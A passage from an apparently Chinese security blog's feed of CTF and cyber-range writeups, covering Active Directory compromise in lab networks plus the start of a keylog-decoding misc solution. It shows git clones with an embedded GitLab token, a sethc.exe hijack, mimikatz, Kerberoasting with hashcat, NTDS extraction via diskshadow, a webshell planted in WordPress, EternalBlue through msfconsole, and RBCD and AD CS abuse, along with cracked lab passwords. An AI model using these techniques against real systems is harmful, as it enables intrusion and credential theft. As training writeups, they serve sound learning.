uot;:&#123;&quot;cadence&quot;:&quot;1d&quot;,&quot;enabled&quot;:false,&quot;keep_n&quot;:10,&quot;older_than&quot;:&quot;90d&quot;,&quot;name_regex&quot;:&quot;.*&quot;,&quot;name_regex_keep&quot;:null,&quot;next_run_at&quot;:&quot;2022-12-26T07:18:21.108Z&quot;&#125;,&quot;issues_enabled&quot;:true,&quot;merge_requests_enabled&quot;:true,&quot;wiki_enabled&quot;:true,&quot;jobs_enabled&quot;:true,&quot;snippets_enabled&quot;:true,&quot;container_registry_enabled&quot;:true,&quot;service_desk_enabled&quot;:false,&quot;can_create_merge_request_in&quot;:true,&quot;issues_access_level&quot;:&quot;enabled&quot;,&quot;repository_access_level&quot;:&quot;enabled&quot;,&quot;merge_requests_access_level&quot;:&quot;enabled&quot;,&quot;forking_access_level&quot;:&quot;enabled&quot;,&quot;wiki_access_level&quot;:&quot;enabled&quot;,&quot;builds_access_level&quot;:&quot;enabled&quot;,&quot;snippets_access_level&quot;:&quot;enabled&quot;,&quot;pages_access_level&quot;:&quot;private&quot;,&quot;operations_access_level&quot;:&quot;enabled&quot;,&quot;analytics_access_level&quot;:&quot;enabled&quot;,&quot;container_registry_access_level&quot;:&quot;enabled&quot;,&quot;security_and_compliance_access_level&quot;:&quot;private&quot;,&quot;releases_access_level&quot;:&quot;enabled&quot;,&quot;environments_access_level&quot;:&quot;enabled&quot;,&quot;feature_flags_access_level&quot;:&quot;enabled&quot;,&quot;infrastructure_access_level&quot;:&quot;enabled&quot;,&quot;monitor_access_level&quot;:&quot;enabled&quot;,&quot;emails_disabled&quot;:null,&quot;shared_runners_enabled&quot;:true,&quot;lfs_enabled&quot;:true,&quot;creator_id&quot;:1,&quot;import_status&quot;:&quot;none&quot;,&quot;open_issues_count&quot;:0,&quot;ci_default_git_depth&quot;:20,&quot;ci_forward_deployment_enabled&quot;:true,&quot;ci_job_token_scope_enabled&quot;:false,&quot;ci_separated_caches&quot;:true,&quot;ci_opt_in_jwt&quot;:false,&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;:true,&quot;public_jobs&quot;:true,&quot;build_timeout&quot;:3600,&quot;auto_cancel_pending_pipelines&quot;:&quot;enabled&quot;,&quot;ci_config_path&quot;:null,&quot;shared_with_groups&quot;:[],&quot;only_allow_merge_if_pipeline_succeeds&quot;:false,&quot;allow_merge_on_skipped_pipeline&quot;:null,&quot;restrict_user_defined_variables&quot;:false,&quot;request_access_enabled&quot;:true,&quot;only_allow_merge_if_all_discussions_are_resolved&quot;:false,&quot;remove_source_branch_after_merge&quot;:true,&quot;printing_merge_request_link_enabled&quot;:true,&quot;merge_method&quot;:&quot;merge&quot;,&quot;squash_option&quot;:&quot;default_off&quot;,&quot;enforce_auth_checks_on_uploads&quot;:true,&quot;suggestion_commit_message&quot;:null,&quot;merge_commit_template&quot;:null,&quot;squash_commit_template&quot;:null,&quot;issue_branch_template&quot;:null,&quot;auto_devops_enabled&quot;:true,&quot;auto_devops_deploy_strategy&quot;:&quot;continuous&quot;,&quot;autoclose_referenced_issues&quot;:true,&quot;keep_latest_artifact&quot;:true,&quot;runner_token_expiration_interval&quot;:null,&quot;permissions&quot;:&#123;&quot;project_access&quot;:null,&quot;group_access&quot;:null&#125;&#125;]</span><br></pre></td></tr></table></figure><p>总共有四个项目，全部克隆下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git</span><br><span class="line">proxychains4 git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git</span><br><span class="line">proxychains4 git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git</span><br><span class="line">proxychains4 git <span class="built_in">clone</span> http://gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git</span><br></pre></td></tr></table></figure><p>在xradmin/ruoyi-admin/src/main/resources/appliaction-druid.yml中能找到oracle数据库的账号密码</p><figure><imgsrc="/images/春秋云境-Privilege/1754192926265-1c660520-3343-4d55-ac94-776f7e875fa1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>由于xradmin有dba权限，所以可以用odat直接添加管理员用户</p><figure><imgsrc="/images/春秋云境-Privilege/1754193203613-9267de9f-44c8-4d3b-ab47-e464cb818df9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连上去拿flag</p><figure><imgsrc="/images/春秋云境-Privilege/1754193337982-351ff067-ec71-4d36-a855-4e380368979c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>之前扫到有一台机器叫XR-0923，在之前下载的internal-secret/credential.txt中可以找到对应的账号密码</p><figure><imgsrc="/images/春秋云境-Privilege/1754193510124-0e3ba53a-2a63-4dbe-a14d-f559bf3adf93.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连上去，查看用户权限</p><figure><imgsrc="/images/春秋云境-Privilege/1754201294362-3d4cf3cb-8a62-4c26-bde5-0dac2ced3134.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用户属于Remote Desktop Users和Remote ManagementUse两个组，因此可以用evil-winrm连上去</p><figure><imgsrc="/images/春秋云境-Privilege/1754201495875-aa3e94b2-63a0-4f48-ad7d-2da59f140e73.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查看用户权限，有了SeRestorePrivilege权限，因此可以直接修改注册表</p><figure><imgsrc="/images/春秋云境-Privilege/1754201542174-1c4a6753-54a6-4a4d-af2f-f6bf519fb35b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>劫持粘滞键sethc.exe</p><figure><imgsrc="/images/春秋云境-Privilege/1754201879512-2691dcba-4bbb-48df-8629-329ea92ebbd0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>注销后按五次shift，提权成功</p><figure><imgsrc="/images/春秋云境-Privilege/1754205748535-07abf577-7937-4438-aecf-f81103228865.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>读flag</p><figure><imgsrc="/images/春秋云境-Privilege/1754205755661-a2ab9074-3936-4224-b22b-63746a8ab0d8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>添加一个管理员用户</p><figure><imgsrc="/images/春秋云境-Privilege/1754205762507-8e8f5a2f-9bc9-404d-ac7a-ba0310e7b9ce.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传mimikatz抓一下哈希</p><figure><imgsrc="/images/春秋云境-Privilege/1754205768264-6d628ecb-955a-4926-b7df-23bbb248431a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>找有spn的用户，找到一个tianjing</p><figure><imgsrc="/images/春秋云境-Privilege/1754205773780-8c49445f-09bd-41a2-a99c-dba370d13576.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>获取其哈希</p><figure><imgsrc="/images/春秋云境-Privilege/1754203371751-cca594ab-6428-457e-8da0-1452272fd94e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 1.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Privilege/1754203467720-095c354d-2aff-49eb-9e7c-c302daad5462.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用evil-winrm登上去，看下权限</p><figure><imgsrc="/images/春秋云境-Privilege/1754203625381-475bc256-b0e2-42d8-898a-c354a5f47784.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>有备份和还原目录的权限，可以用卷影拷贝读SAM</p><p>本地创建一个raj.dsh，内容为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> context persistent nowriters</span><br><span class="line">add volume c: <span class="built_in">alias</span> raj</span><br><span class="line">create</span><br><span class="line">expose %raj% z:</span><br></pre></td></tr></table></figure><p>unix2dos转换为windows的编码格式</p><figure><imgsrc="/images/春秋云境-Privilege/1754203866911-de42f87e-8c25-4049-a84c-ba0b7075249e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在靶机上创建一个目录，把raj.dsh传上去，然后用diskshadow执行</p><figure><imgsrc="/images/春秋云境-Privilege/1754204149098-e35a5afd-d274-47fe-bf96-f3aed1eef072.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>复制到当前目录</p><figure><imgsrc="/images/春秋云境-Privilege/1754204267891-ac1ec4db-4c43-47da-9870-ab794c7e0c65.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载ntds，好慢</p><figure><imgsrc="/images/春秋云境-Privilege/1754204777037-77146f0c-1852-4e9d-8d17-6467f7d802f8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载SYSTEM</p><figure><imgsrc="/images/春秋云境-Privilege/1754205358219-5682f4e9-bd18-4926-964d-3ab90ccd1abf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>本地获取ntlm hash</p><figure><imgsrc="/images/春秋云境-Privilege/1754205500071-01cbe83f-9292-463e-9db4-a61f2aea335a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对域控打pth拿最后一个flag</p><figure><imgsrc="/images/春秋云境-Privilege/1754205676136-b6ee2a35-83fb-457b-81df-c47663697dfa.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-2022网鼎杯半决赛复盘</title>
      <link href="/posts/5f82f87d/"/>
      <url>/posts/5f82f87d/</url>
      
        <content type="html"><![CDATA[<p>访问过去是wordpress</p><p>弱口令admin/123456成功进入后台</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754122647766-235bd3fd-78d8-4da4-b0ae-16cdb5247299.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>给404页面写个马进去</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754122805757-def7e024-a9d9-4281-b22b-63ec34629c2e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>蚁剑连上去，拿到第一个flag</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754122896307-928e85f8-41b8-495f-a099-6b82bf41e861.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754122937091-ae21ae36-00ac-4a7b-a6fd-e5041bd3e00e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>fscan扫内网，除了本机还有四台机器</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754123143384-38d0d46b-732b-4938-9c73-f0e029a9bae3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754123236788-57527b61-bad8-4115-8e30-d8c2ae588cb0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754123248653-d697b3e2-c009-4143-9268-71e490700e56.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先打永恒之蓝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.15.24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754124628045-fbe3eada-6982-4c9d-be75-853f9c4b4626.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>dump哈希</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754124703935-18b0edd4-f535-4111-a2f7-5f4927794c2b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打pth拿到第二个flag</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754124876741-6cf0ae1c-bbcd-4ede-b0b5-4255c2bc6f60.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>访问这台我们打下来的机器，admin/123456弱口令进后台</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754125300505-33b0d378-7452-4747-bd6e-ba5156906972.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里有很多邮箱，全部复制下来去掉xiaorang.lab的后缀做成一个字典</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754125613163-1b409ffc-544a-4912-99c3-721e153fac5c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来打AS-REP Roasting</p><p>找一下有spn的用户，有两个</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754126058657-6837f8da-4cea-45f7-83b4-3b7c9ced917e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>hashcat分别爆破出密码</p><p>lixiuying/winniethepooh</p><p>huachunmei/1qaz2wsx</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754126464812-71f5e647-618f-4f5b-9e8f-44199e97286d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754126541817-d4dd66f5-ed39-4312-9cdb-dde87d883aa2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>bloodhound收集信息</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754127134585-b8fce09d-b23d-4308-ac83-a20ce6237933.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用户lixiuying有GenericWrite权限</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754128451784-1fb9b6a1-8657-49db-acbf-e0945dae127e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来打RBCD</p><p>创建一个机器账户</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754128009563-b22d28e3-dedb-47da-8d03-9157b05f77e0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>配置属性指向域控机器账户</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754128383111-14eb15d9-95b4-4668-bc55-bd00bbd91350.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>获取ST</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754128725881-430b6e2a-1306-4316-bc2c-c67d6c2df10f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ptt拿flag</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754128880929-e095ee11-5c25-4734-a553-0b35d5e316e9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754128904207-a755f532-1291-4748-8b17-8013379a36af.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>创建一个机器账号</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754143298044-6a272d46-e4fe-4359-9712-8691cfe6a862.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看一下证书信息</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754143324633-f8023e01-ed05-4ece-9dbe-b32aa49b6e3d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来打AD CS</p><p>申请模板伪造证书</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754143535712-6c09c2a2-b8e6-4218-9063-1ed916c4e7bf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试获取TGT和NTLM hash，发生报错</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754143648275-4ee61b33-e4aa-41f1-99ee-de56062d285a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这个报错之前在做certify靶标的时候也遇到过，但是在重启了N次以后就成功了。在这里看来是题目本身缺少了智能卡身份验证证书的配置，因此无法通过重启解决。看了大佬们的博客，这里有一种替代方法，可以将问题转化为BCD来解决。</p><p>导出.crt和.key</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754143985670-82554ccc-811d-49db-a662-170f00235185.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>配置RBCD</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754144071206-085d0221-8f8f-4aa9-85c5-b5b795162549.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>申请ST</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754144244490-f1c92e3d-27df-4ea3-9692-09a120e5e968.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最后对域控打ptt即可</p><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754144435031-3cb7cbaa-be83-496e-81db-567790156ad6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-2022网鼎杯半决赛复盘/1754144492544-5edb27d9-204d-47ee-b900-c6d77bc9f9b2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2025 Writeup</title>
      <link href="/posts/d9c744c2/"/>
      <url>/posts/d9c744c2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>今年打娱乐局</p><p><del>游戏题给我打爽了</del></p></blockquote><h2 id="misc">Misc</h2><h3 id="nepbotevent">NepBotEvent</h3><p>查了一下这是linux用evdev捕获的数据，写个脚本还原一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">KEY_MAP = &#123;</span><br><span class="line">    <span class="number">2</span>: (<span class="string">&quot;1&quot;</span>, <span class="string">&quot;!&quot;</span>), <span class="number">3</span>: (<span class="string">&quot;2&quot;</span>, <span class="string">&quot;@&quot;</span>), <span class="number">4</span>: (<span class="string">&quot;3&quot;</span>, <span class="string">&quot;#&quot;</span>), <span class="number">5</span>: (<span class="string">&quot;4&quot;</span>, <span class="string">&quot;$&quot;</span>), <span class="number">6</span>: (<span class="string">&quot;5&quot;</span>, <span class="string">&quot;%&quot;</span>),</span><br><span class="line">    <span class="number">7</span>: (<span class="string">&quot;6&quot;</span>, <span class="string">&quot;^&quot;</span>), <span class="number">8</span>: (<span class="string">&quot;7&quot;</span>, <span class="string">&quot;&amp;&quot;</span>), <span class="number">9</span>: (<span class="string">&quot;8&quot;</span>, <span class="string">&quot;*&quot;</span>), <span class="number">10</span>: (<span class="string">&quot;9&quot;</span>, <span class="string">&quot;(&quot;</span>), <span class="number">11</span>: (<span class="string">&quot;0&quot;</span>, <span class="string">&quot;)&quot;</span>),</span><br><span class="line">    <span class="number">12</span>: (<span class="string">&quot;-&quot;</span>, <span class="string">&quot;_&quot;</span>), <span class="number">13</span>: (<span class="string">&quot;=&quot;</span>, <span class="string">&quot;+&quot;</span>), <span class="number">16</span>: (<span class="string">&quot;q&quot;</span>, <span class="string">&quot;Q&quot;</span>), <span class="number">17</span>: (<span class="string">&quot;w&quot;</span>, <span class="string">&quot;W&quot;</span>), <span class="number">18</span>: (<span class="string">&quot;e&quot;</span>, <span class="string">&quot;E&quot;</span>),</span><br><span class="line">    <span class="number">19</span>: (<span class="string">&quot;r&quot;</span>, <span class="string">&quot;R&quot;</span>), <span class="number">20</span>: (<span class="string">&quot;t&quot;</span>, <span class="string">&quot;T&quot;</span>), <span class="number">21</span>: (<span class="string">&quot;y&quot;</span>, <span class="string">&quot;Y&quot;</span>), <span class="number">22</span>: (<span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>), <span class="number">23</span>: (<span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>),</span><br><span class="line">    <span class="number">24</span>: (<span class="string">&quot;o&quot;</span>, <span class="string">&quot;O&quot;</span>), <span class="number">25</span>: (<span class="string">&quot;p&quot;</span>, <span class="string">&quot;P&quot;</span>), <span class="number">26</span>: (<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&#123;&quot;</span>), <span class="number">27</span>: (<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&#125;&quot;</span>), <span class="number">30</span>: (<span class="string">&quot;a&quot;</span>, <span class="string">&quot;A&quot;</span>),</span><br><span class="line">    <span class="number">31</span>: (<span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>), <span class="number">32</span>: (<span class="string">&quot;d&quot;</span>, <span class="string">&quot;D&quot;</span>), <span class="number">33</span>: (<span class="string">&quot;f&quot;</span>, <span class="string">&quot;F&quot;</span>), <span class="number">34</span>: (<span class="string">&quot;g&quot;</span>, <span class="string">&quot;G&quot;</span>), <span class="number">35</span>: (<span class="string">&quot;h&quot;</span>, <span class="string">&quot;H&quot;</span>),</span><br><span class="line">    <span class="number">36</span>: (<span class="string">&quot;j&quot;</span>, <span class="string">&quot;J&quot;</span>), <span class="number">37</span>: (<span class="string">&quot;k&quot;</span>, <span class="string">&quot;K&quot;</span>), <span class="number">38</span>: (<span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>), <span class="number">39</span>: (<span class="string">&quot;;&quot;</span>, <span class="string">&quot;:&quot;</span>), <span class="number">40</span>: (<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>),</span><br><span class="line">    <span class="number">41</span>: (<span class="string">&quot;`&quot;</span>, <span class="string">&quot;~&quot;</span>), <span class="number">43</span>: (<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;|&quot;</span>), <span class="number">44</span>: (<span class="string">&quot;z&quot;</span>, <span class="string">&quot;Z&quot;</span>), <span class="number">45</span>: (<span class="string">&quot;x&quot;</span>, <span class="string">&quot;X&quot;</span>), <span class="number">46</span>: (<span class="string">&quot;c&quot;</span>, <span class="string">&quot;C&quot;</span>),</span><br><span class="line">    <span class="number">47</span>: (<span class="string">&quot;v&quot;</span>, <span class="string">&quot;V&quot;</span>), <span class="number">48</span>: (<span class="string">&quot;b&quot;</span>, <span class="string">&quot;B&quot;</span>), <span class="number">49</span>: (<span class="string">&quot;n&quot;</span>, <span class="string">&quot;N&quot;</span>), <span class="number">50</span>: (<span class="string">&quot;m&quot;</span>, <span class="string">&quot;M&quot;</span>), <span class="number">51</span>: (<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&lt;&quot;</span>),</span><br><span class="line">    <span class="number">52</span>: (<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&gt;&quot;</span>), <span class="number">53</span>: (<span class="string">&quot;/&quot;</span>, <span class="string">&quot;?&quot;</span>), <span class="number">57</span>: (<span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>), <span class="number">28</span>: (<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODIFIER_KEYS = &#123;</span><br><span class="line">    <span class="string">&quot;SHIFT&quot;</span>: [<span class="number">42</span>, <span class="number">54</span>],</span><br><span class="line">    <span class="string">&quot;CAPSLOCK&quot;</span>: [<span class="number">58</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_keylog</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    record_size = <span class="number">24</span></span><br><span class="line">    records = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), record_size):</span><br><span class="line">        chunk = data[i:i+record_size]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(chunk) != record_size:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ts_sec, ts_usec, type_, code, value = struct.unpack(<span class="string">&quot;qqHHI&quot;</span>, chunk)</span><br><span class="line">        timestamp = datetime.fromtimestamp(ts_sec + ts_usec / <span class="number">1_000_000</span>)</span><br><span class="line">        records.append(&#123;</span><br><span class="line">            <span class="string">&quot;timestamp&quot;</span>: timestamp,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: type_,</span><br><span class="line">            <span class="string">&quot;code&quot;</span>: code,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: value</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">return</span> records</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_text</span>(<span class="params">records</span>):</span><br><span class="line">    shift = <span class="literal">False</span></span><br><span class="line">    capslock = <span class="literal">False</span></span><br><span class="line">    output = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> records:</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&quot;type&quot;</span>] != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        code = r[<span class="string">&quot;code&quot;</span>]</span><br><span class="line">        value = r[<span class="string">&quot;value&quot;</span>] </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">in</span> MODIFIER_KEYS[<span class="string">&quot;SHIFT&quot;</span>]:</span><br><span class="line">            shift = value == <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> code <span class="keyword">in</span> MODIFIER_KEYS[<span class="string">&quot;CAPSLOCK&quot;</span>] <span class="keyword">and</span> value == <span class="number">1</span>:</span><br><span class="line">            capslock = <span class="keyword">not</span> capslock</span><br><span class="line">        <span class="keyword">elif</span> value == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> code <span class="keyword">in</span> KEY_MAP:</span><br><span class="line">                char_lower, char_upper = KEY_MAP[code]</span><br><span class="line">                <span class="keyword">if</span> char_lower.isalpha():</span><br><span class="line">                    char = char_upper <span class="keyword">if</span> shift ^ capslock <span class="keyword">else</span> char_lower</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    char = char_upper <span class="keyword">if</span> shift <span class="keyword">else</span> char_lower</span><br><span class="line">                output.append(char)</span><br><span class="line">            <span class="keyword">elif</span> code == <span class="number">14</span>: </span><br><span class="line">                <span class="keyword">if</span> output:</span><br><span class="line">                    output.pop()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(output)</span><br><span 